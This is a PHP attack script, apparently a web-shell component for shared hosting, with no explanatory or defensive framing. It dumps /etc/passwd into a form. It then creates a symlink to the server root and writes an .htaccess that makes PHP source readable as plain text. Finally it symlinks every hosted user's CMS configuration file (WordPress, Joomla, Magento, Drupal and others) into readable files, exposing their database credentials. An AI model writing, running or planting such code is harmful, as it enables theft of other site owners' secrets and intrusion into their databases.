<?php
if($_POST['jembud']){
@mkdir("vhost_c7e", 0777);
@chdir("vhost_c7e");
system("ln -s / root");
$htaccess="
Options Indexes FollowSymLinks
DirectoryIndex ngeue.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etcp=$_POST['passwd'];
    
$etcp=explode("\n",$etcp);
foreach($etcp as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
system("ln -s ".$user."/httpdocs/wp-config.php ".$jembod."-Wordpress.txt");
system("ln -s ".$user."/httpdocs/configuration.php ".$jembod."-Joomla.txt");
system("ln -s ".$user."/httpdocs/config/koneksi.php ".$jembod."-Lokomedia.txt");
system("ln -s ".$user."/httpdocs/forum/config.php ".$jembod."-phpBB.txt");
system("ln -s ".$user."/httpdocs/sites/default/settings.php ".$jembod."-Drupal.txt");
system("ln -s ".$user."/httpdocs/config/settings.inc.php ".$jembod."-PrestaShop.txt");
system("ln -s ".$user."/httpdocs/app/etc/local.xml ".$jembod."-Magento.txt");
system("ln -s ".$user."/httpdocs/admin/config.php ".$jembod."-OpenCart.txt");
system("ln -s ".$user."/httpdocs/application/config/database.php ".$jembod."-Ellislab.txt");
system("ln -s ".$user."/httpdocs/inc/connect.php ".$jembod."-Parallels.txt");
system("ln -s ".$user."/httpdocs/inc/config.php ".$jembod."-MyBB.txt");

}
}
echo "<center><a href='vhost_c7e/root/'><u>Symlinknya</u></a><br><a href='vhost_c7e/'><u>Config Nya Njing</u></a>";
}else{
echo "<center><form method='POST' action=''>
<textarea name='passwd' rows='15' cols='60'>";
echo include("/etc/passwd");
echo "</textarea>";
echo "<br><br>";
echo "<input type='submit' name='jembud' value='gaaskeunn!!'></center>";
}
